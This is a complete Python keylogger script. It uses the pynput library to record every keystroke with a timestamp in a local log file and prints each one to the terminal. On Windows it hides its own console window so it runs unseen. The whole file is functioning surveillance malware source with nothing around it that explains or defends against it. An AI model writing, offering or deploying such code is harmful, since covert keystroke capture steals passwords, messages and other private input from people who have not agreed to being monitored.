from pynput import keyboard
from datetime import datetime
import os

LOG_FILE = "log.txt"

def write_log(key):
    line = f"{datetime.now()} - {key}"
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")
    print(line)  # Live feed to terminal

def on_press(key):
    try:
        write_log(key.char)
    except AttributeError:
        write_log(str(key))

def hide_window():
    import platform
    if platform.system() == "Windows":
        import ctypes
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd:
            ctypes.windll.user32.ShowWindow(whnd, 0)

if __name__ == "__main__":
    hide_window()
    print("[*] Starting keylogger with live keystroke feed. Press Ctrl+C to stop.")
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n[*] Keylogger stopped by user.")
